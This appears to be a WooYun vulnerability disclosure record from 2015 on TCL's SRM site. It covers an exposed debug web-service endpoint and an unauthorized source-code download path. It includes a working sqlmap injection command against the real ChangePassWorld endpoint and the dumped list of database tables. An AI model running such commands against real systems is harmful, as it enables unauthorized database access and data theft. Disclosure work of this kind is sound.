{"id": 34649, "wybug_id": "wooyun-2015-0105863", "wybug_title": "tcl某站点多处信息泄漏导致sql注入", "wybug_corp": "TCL官方网上商城", "wybug_author": "白非白", "wybug_date": "2015-04-05 23:25", "wybug_open_date": "2015-05-20 23:32", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-20：\t细节向公众公开  简要描述： 1.未授权访问导致的源码泄漏2.信息泄漏导致的sql注入 详细说明：  1.信息泄漏导致的sql注入（看的越细，收获越多）tcl某系统登录地址：http://srm.tclking.com（登录处没有注入）\n\n查看网页源码，发现这个一个调试连接：http://srm.tclking.com/vmi/WebService/WS_Login.asmx/jsdebug去掉调试参数jsdebug之后，直接访问这个地址：\nhttp://srm.tclking.com/vmi/WebService/WS_Login.asmx\n\n\n打开changepassword接口页面并且提交一个调用请求即产生报错：\nhttp://srm.tclking.com/vmi/WebService/WS_Login.asmx?op=ChangePassWorld\n\n\n直接放到sqlmap中跑：\nc:\\Python27>python.exe sqlmap\\sqlmap.py -u \"http://srm.tclking.com/vmi/WebService/WS_Login.asmx/ChangePassWorld\" --data=\"Account=test&OldPassWorld=1&NewPassWorld=1\" --tables -D EIP\n\n\n\nDatabase: EIP[91 tables]+------------------------+| EIP_Custmast           || H_Vmi_ocsupparmast     || H_Vmi_ocsupparmast     || H_Vmi_tgbom            || H_Vmi_vmibom           || HorizontalPlan         || IN_ProBase             || IN_Supplier            || In_WHInComeDetail      || In_WHInComeDetail      || OA_Account             || OA_AccountRight        || OA_DocuMentList        || OA_MainDocuMent        || OA_SMS                 || Oa_Position            || Oa_RightMast           || PlanCtv                || PlanDocumno            || SM_OABusFlow           || SM_TreeTest            || SM_UserMast            || VMI_ActFlow            || VMI_Base               || VMI_JudgeInfo          || VMI_TempTable          || VMI_facshop            || VMI_orderseq           || VMI_prOCBOMdetail_bak  || VMI_prOCBOMdetail_bak  || VMI_prOCBOMdetail_temp || Vmi_EmailRemind        || Vmi_ForecastM          || Vmi_ForecastM          || Vmi_Modelmast          || Vmi_OCProcess          || Vmi_OCRemote           || Vmi_OcClearFlag        || Vmi_PRLog              || Vmi_PartArrival        || Vmi_RecentPlanM        || Vmi_RecentPlanM        || Vmi_SendIF             || Vmi_autoRunLog         || Vmi_dayplanM           || Vmi_itemcontrol        || Vmi_itemmast           || Vmi_itemtemp           || Vmi_line_cn            || Vmi_mcbalance          || Vmi_mcstock            || Vmi_mcsuppar           || Vmi_ocsupparmast       || Vmi_ocsupparmast       || Vmi_partrep            || Vmi_prdetail           || Vmi_prmaster           || Vmi_reqdetail          || Vmi_reqmast            || Vmi_supmast            || Vmi_tebombak           || Vmi_tebombak           || Vmi_tgbom              || Vmi_txndetailh         || Vmi_txndetailh         || Vmi_txnheadh           || Vmi_txnheadh           || Vmi_userSsec           || Vmi_userwsec           || Vmi_vmibombak          || Vmi_vmibombak          || Vmi_whsmast            || comnSms_Account        || comnSms_Account        || hr_dept                || pbcatcol               || pbcatedt               || pbcatfmt               || pbcattbl               || pbcatvld               || sqlmapoutput           || sysdiagrams            || temp_OcnoHead          || vmi_OCPartSub          || vmi_dayplandetail2     || vmi_dayplandetail_bak  || vmi_dayplandetail_bak  || vmi_dayplandetail_bak  || vmi_octest             || vmi_tempJX             || vmi_transstock         |+------------------------+\n2.未授权导致的源码泄漏(跟海尔的这个一样，使用了同一个系统 WooYun: 海尔某系统未授权访问致系统源码泄露 ）tcl某站点SAP NetWeaver Portal网址\nhttp://srm.tclking.com:8000/logon/logonServlet\n未授权访问路径\nhttp://srm.tclking.com:8000//htmlb/jsp/jsp.zip\n\n\n打开jsp.zip\n\n\n\n   漏洞证明：  存在多张用户表。   修复方案：  该网站两个端口的问题都要修复。   版权声明：转载请注明来源 白非白@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-05 23:31 厂商回复： 感谢你的工作，已转交相关单位处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}